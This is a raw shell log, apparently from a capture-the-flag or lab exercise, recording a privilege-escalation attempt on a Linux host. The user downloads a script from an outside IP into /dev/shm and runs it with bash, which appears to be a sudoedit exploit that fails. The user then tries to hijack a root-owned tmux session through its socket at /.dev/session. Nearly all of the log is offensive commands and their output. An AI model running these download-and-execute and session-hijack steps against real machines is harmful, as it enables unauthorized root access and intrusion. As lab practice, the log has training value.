wget http://10.6.7.134/51217
--2023-10-04 18:31:01--  http://10.6.7.134/51217
Connecting to 10.6.7.134:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1579 (1.5K) [application/octet-stream]
Saving to: '51217'


51217                 0%[                    ]       0  --.-KB/s               
51217               100%[===================>]   1.54K  --.-KB/s    in 0s      

2023-10-04 18:31:01 (313 MB/s) - '51217' saved [1579/1579]

gloria@lion:/dev/shm$ ls
51217
gloria@lion:/dev/shm$ mv 51217 run.sh
gloria@lion:/dev/shm$ bash run.sh
[sudo] password for gloria: 
Sorry, try again.
[sudo] password for gloria: 
Sorry, try again.
[sudo] password for gloria: 
sudo: 3 incorrect password attempts
> It doesn't seem that this user can run sudoedit as root
Do you want to proceed anyway? (y/N): N
gloria@lion:/dev/shm$ rm run .sh
rm: cannot remove 'run': No such file or directory
rm: cannot remove '.sh': No such file or directory
gloria@lion:/dev/shm$ rm run.sh
gloria@lion:/dev/shm$ ps -elf | grep tmux
1 S root      1223     1  0  80   0 -  7033 -      18:02 ?        00:00:00 /usr/bin/tmux -S /.dev/session new-session -d
0 S gloria    3878  2639  0  80   0 -  2825 pipe_w 18:32 pts/2    00:00:00 grep --color=auto tmux
gloria@lion:/dev/shm$ /usr/bin/tmux -S /.dev/session new-session -d
gloria@lion:/dev/shm$ /usr/bin/tmux -S /.dev/session
open terminal failed: missing or unsuitable terminal: unknown
gloria@lion:/dev/shm$ /usr/bin/tmux -S /.dev/session
open terminal failed: missing or unsuitable terminal: unknown
gloria@lion:/dev/shm$ exit
exit
